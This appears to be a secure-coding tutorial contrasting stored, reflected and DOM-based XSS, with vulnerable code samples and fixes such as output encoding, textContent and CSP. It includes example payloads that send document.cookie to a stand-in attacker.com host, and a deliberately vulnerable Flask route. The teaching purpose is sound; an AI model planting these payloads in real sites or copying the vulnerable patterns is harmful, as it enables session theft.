  "body_mdx": "## Three Different Bugs, One Name\n\nCross-site scripting (XSS) is treated as a single vulnerability class in most tutorials. In practice, stored XSS, reflected XSS, and DOM-based XSS have different attack surfaces, different detection methods, and different mitigations. Fixing one category gives you no protection against the others.\n\nThe shared mechanism is this: attacker-controlled data ends up in a browser context where it's interpreted as code instead of as content. The difference is where that data comes from and how it gets there.\n\n## Stored XSS: The Persistent Version\n\nStored XSS happens when attacker-controlled input is saved to a database and then rendered in a browser for other users without sanitization. A comment, a profile bio, a message, a ticket title, all are potential storage locations.\n\n```html\n<!-- Attacker submits this as a comment -->\n<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>\n\n<!-- Server renders it directly in the page for every other user -->\n<div class=\"comment\">\n  <script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>\n</div>\n```\n\nEvery user who loads the page with that comment runs the attacker's script. The attacker doesn't need to be present. The script runs in the victim's session, with the victim's cookies and DOM access.\n\nThe impact depends on what the script does. Common payloads exfiltrate session cookies, capture keystrokes, make requests with the victim's credentials, or silently redirect to phishing pages.\n\n## Reflected XSS: The One-Shot Version\n\nReflected XSS requires the attacker to deliver a malicious URL to the victim. The payload is in the URL parameter. The server reads the parameter and echoes it back in the response without sanitizing it.\n\n```python\n# Flask example — reflects search query directly into response\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable — unsanitized query reflected into HTML\n    return f'<p>Results for: {query}</p>'\n```\n\nAttacker crafts a URL:\n```\nhttps://example.com/search?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>\n```\n\nWhen the victim clicks the link, the server echoes the payload back in the HTML response. The browser parses the HTML and executes the script. The session cookie goes to the attacker.\n\nReflected XSS is harder to exploit at scale because it requires the attacker to trick each victim individually. It still works effectively in targeted attacks and phishing campaigns.\n\n## DOM-Based XSS: The Server-Blind Version\n\nDOM-based XSS is categorically different. The server sends a perfectly clean response. The vulnerability exists in JavaScript code running in the browser, which reads from an attacker-controlled source and writes to a dangerous sink.\n\n```javascript\n// Vulnerable — reads from location.hash (attacker-controlled), writes to innerHTML (dangerous)\ndocument.addEventListener('DOMContentLoaded', () => {\n  const tab = location.hash.slice(1) // reads #profile, #settings, etc.\n  document.getElementById('content').innerHTML = `Loading tab: ${tab}`\n  // Attacker navigates to: page.html#<img src=x onerror=alert(1)>\n})\n\n// Fixed — use textContent for plain text, or sanitize before innerHTML\ndocument.addEventListener('DOMContentLoaded', () => {\n  const tab = location.hash.slice(1)\n  const content = document.getElementById('content')\n  content.textContent = `Loading tab: ${tab}` // never interpreted as HTML\n})\n```\n\nServer-side sanitization does nothing here. The payload never touches the server. It travels from `location.hash` directly to `innerHTML` inside client-side JavaScript.\n\n```mermaid\nflowchart LR\n    subgraph Stored XSS\n        A1[Attacker submits payload] --> B1[Server stores in DB]\n        B1 --> C1[Server renders to victim] --> D1[Script executes]\n    end\n    subgraph Reflected XSS\n        A2[Attacker sends URL with payload] --> B2[Victim clicks]\n        B2 --> C2[Server reflects payload in response] --> D2[Script executes]\n    end\n    subgraph DOM-Based XSS\n        A3[Attacker crafts URL with payload] --> B3[Victim loads page]\n        B3 --> C3[Clean server response]\n        C3 --> D3[JS reads URL hash / search]\n        D3 --> E3[JS writes to innerHTML] --> F3[Script executes]\n        style C3 fill:#c8f7c5\n    end\n```\n\n## Common Sources and Sinks\n\n**Attacker-controlled sources** (places in JavaScript where attacker input can originate):\n- `location.href`, `location.search`, `location.hash`\n- `document.referrer`\n- `window.name`\n- `postMessage` data\n- IndexedDB / localStorage if attacker can write to it\n\n**Dangerous sinks** (places where data is interpreted as HTML or code):\n- `element.innerHTML`\n- `element.outerHTML`\n- `document.write()`\n- `eval()` and `new Function()`\n- `setTimeout(string)` and `setInterval(string)`\n- jQuery's `$(selector)` when selector is user-controlled\n- `location.href = unsanitizedValue` (for javascript: URLs)\n\nThe full XSS attack surface is any path that connects an attacker-controlled source to a dangerous sink.\n\n## Mitigations by Category\n\n**For stored and reflected XSS**, output encoding is the primary defense. When rendering user content in HTML, every character that has special meaning in HTML must be escaped.\n\n```python\nimport html\n\n# Correct — escape before inserting into HTML context\ndef render_comment(comment_text: str) -> str:\n    escaped = html.escape(comment_text)  # & → &amp;  < → &lt;  > → &gt;\n    return f'<p class=\"comment\">{escaped}</p>'\n\n# If you need to allow some HTML (rich text editors), use a strict allowlist\n# Never use a blocklist — attackers have decades of bypass experience\nfrom bleach import clean, linkify\n\ndef render_rich_comment(html_content: str) -> str:\n    allowed_tags = ['b', 'i', 'em', 'strong', 'a', 'p']\n    allowed_attrs = {'a': ['href', 'title']}\n    return clean(html_content, tags=allowed_tags, attributes=allowed_attrs)\n```\n\n**For DOM-based XSS**, audit every place JavaScript reads from a user-controlled source and writes to a DOM property:\n- Use `textContent` instead of `innerHTML` when you're inserting plain text.\n- Use a Content Security Policy (CSP) to block inline scripts and restrict script sources.\n- For frameworks like React and Vue: the default is safe (they escape output). The unsafe patterns are `dangerouslySetInnerHTML` in React and `v-html` in Vue. Treat those as code review red flags.\n\n```jsx\n// React — safe by default\nfunction Comment({ text }) {\n  return <p>{text}</p>  // React escapes this automatically\n}\n\n// React — dangerous, requires explicit audit\nfunction Comment({ html }) {\n  return <p dangerouslySetInnerHTML={{ __html: html }} />\n  // If html comes from user input, this is XSS\n}\n```\n\n**Content Security Policy** limits the damage if XSS occurs. A CSP that disallows inline scripts and restricts allowed script sources means the attacker's injected script often won't execute, because the browser blocks it.\n\n```\nContent-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; object-src 'none';\n```\n\nCSP is a defense-in-depth layer, not a substitute for output encoding. Get the encoding right first, then add CSP.\n\n**HTTPOnly cookies** don't prevent XSS, but they prevent the most common payload: `document.cookie` exfiltration. An XSS attacker can still make authenticated requests in the victim's session. HTTPOnly just removes one tool from their kit.\n\n## The Testing Gap\n\nMost XSS testing focuses on reflected XSS because it's easy to test manually. Stored XSS requires looking at every form that stores user input and every page that renders it. DOM-based XSS requires code review or a browser-side scanner, because server-side scanners don't see client-side code execution.\n\nTreat each type as a separate audit item. A check that covers reflected XSS in your URL parameters tells you nothing about whether your JavaScript is safely handling `location.hash`."
